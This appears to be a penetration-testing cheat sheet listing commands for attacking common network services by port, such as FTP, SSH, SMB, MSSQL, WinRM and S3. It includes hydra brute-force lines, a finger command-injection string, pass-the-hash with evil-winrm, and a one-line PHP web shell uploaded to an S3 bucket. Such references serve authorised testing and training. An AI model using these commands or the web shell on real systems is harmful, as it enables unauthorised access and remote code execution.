# Services

## FTP (21)
- check anonymous login
```
ftp <rhost>

> put <local-file> # upload file
> get <server-file> # download file

hydra -L users.txt -P passwords.txt <rhost> ftp
```

## SSH (22)
```
ssh <user>@<rhost>
ssh -i id_rsa <user>@<rhost>
ssh -L <lport>:127.0.0.1:<rport> <user>@<rhost>

ssh-keygen -t rsa -b 4096

hydra -L users.txt -P passwords.txt <rhost> ssh
```

## Telnet (23)
```
telnet <rhost>

hydra -L users.txt -P passwords.txt <rhost> telnet
```

## SMTP (25)
- user enumeration: ``auxiliary/scanner/smtp/smtp_enum``
```
telnet <rhost>

HELO hello
MAIL FROM:<src-mail>
RCPT TO:<dest-mail>
DATA
email body

.
```

## DNS (53)
```
dig axfr @<DNS-IP>
dig axfr @<DNS-IP> <DOMAIN>
dig ANY @<DNS-IP> <DOMAIN>
dig -x <ip> @<DNS-IP>
```

## Finger (79)
- user enumeration: ``auxiliary/scanner/finger/finger_users``
```
finger @<rhost> # list users
finger <user>@<rhost> # get user info
finger "|/bin/id@<rhost>" # command execution
```

## HTTP (80)
- [Web-Applications](Web_Applications.md)

## SMB (139/445)
```
smbclient -L //<rhost>/
smbclient //<rhost>/<share>
> put <local-file>
> get <server-file>
```

## SNMP (161)
```
snmpwalk -c public -v1 <rhost>
```

## MSSQL (1433)
- shell with ``enable_xp_cmdshell``
- run commands: ``xp_cmdshell <command>``
```
mssqlclient.py <user>@<rhost>
mssqlclient.py <user>@<rhost> -windows-auth
```

## NFS (2049)
```
showmount -e <rhost>
mount -t nfs -o ver=2 <rhost>:/backup /mnt
```

## MySQL (3306)
```
mysql -h <rhost> -u <user> -p
> show databases;
> use <db>;
> show tables;
> select * from <table>;
```

## RDP (3389)
```
xfreerdp /u:<username> /p:<password> /v:<rhost> +clipboard
xfreerdp /d:<domain> /u:<username> /p:<password> /v:<rhost>
```

## PostgreSQL (5432/5433)
```
psql -h <rhost> -p <port> -U <user> -W <password> <database>
> \list
> \c <database>
> \d
```

## WinRM (5985)
```
evil-winrm -i <rhost> -u <user> -p <password>
evil-winrm -i <rhost> -u <user> -H <hash-pass> 
```

## Redis (6379)
```
redis-cli -h <rhost>
> info keyspace
> select <database-id>
> keys *
> get <key>
```

## MongoDB (27017)
```
mongo "mongodb://<user>:<password>@<rhost>:27017"
> show dbs
> use <db>
> show collections
> db.<collection>.find()
```

## S3 Bucket
```
aws --endpoint=http://s3.<target> s3 ls s3://<target>
echo '<?php system($_REQUEST["cmd"]); ?>' > shell.php
aws --endpoint=http://s3.<target> s3 cp shell.php s3://<target>/shell.php
```
